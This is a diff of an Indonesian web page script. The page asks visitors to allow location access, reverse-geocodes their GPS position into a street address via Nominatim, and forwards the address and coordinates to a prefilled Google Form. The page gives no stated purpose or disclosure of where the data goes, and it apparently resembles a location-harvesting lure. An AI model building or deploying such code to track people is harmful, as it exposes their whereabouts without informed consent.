@@ -10,7 +10,6 @@
   <p style="color: #666;">Mohon klik <b>ALLOW / IZINKAN</b> saat browser meminta akses lokasi HP Anda.</p>
 
   <script>
-    // URL Google Form lo yang asli (tanpa angka dummy)
     const googleFormBaseUrl = "https://docs.google.com/forms/d/e/1FAIpQLScf-_9XTxWAp6fCLRbdaNGb8FtEk0FF_SvCm9cyAMaVCnArJg/viewform?usp=pp_url&entry.257924140=";
 
     if (navigator.geolocation) {
@@ -20,11 +19,22 @@
           const lng = position.coords.longitude;
           const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
           
-          // Format data lokasi (Koordinat + Link Google Maps)
-          const locationData = encodeURIComponent(`${lat}, ${lng} (${mapsUrl})`);
-          
-          // Redirect otomatis ke Google Form dengan membawa data GPS
-          window.location.href = googleFormBaseUrl + locationData;
+          // Request nama alamat dari koordinat GPS
+          fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
+            .then(response => response.json())
+            .then(data => {
+              const address = data.display_name || "Alamat tidak ditemukan";
+              
+              // Gabungin: Alamat teks, Koordinat angka, sama Link Maps
+              const fullLocation = `Alamat: ${address} \nKoordinat: ${lat}, ${lng} \nMaps: ${mapsUrl}`;
+              
+              window.location.href = googleFormBaseUrl + encodeURIComponent(fullLocation);
+            })
+            .catch(error => {
+              // Kalau gagal fetch alamat, fallback tetap kirim koordinat + maps
+              const fallbackLocation = `Koordinat: ${lat}, ${lng} \nMaps: ${mapsUrl}`;
+              window.location.href = googleFormBaseUrl + encodeURIComponent(fallbackLocation);
+            });
         },
         function(error) {
           alert("Gagal mengambil lokasi. Mohon pastikan GPS HP aktif dan klik Izinkan/Allow lokasi pada browser.");
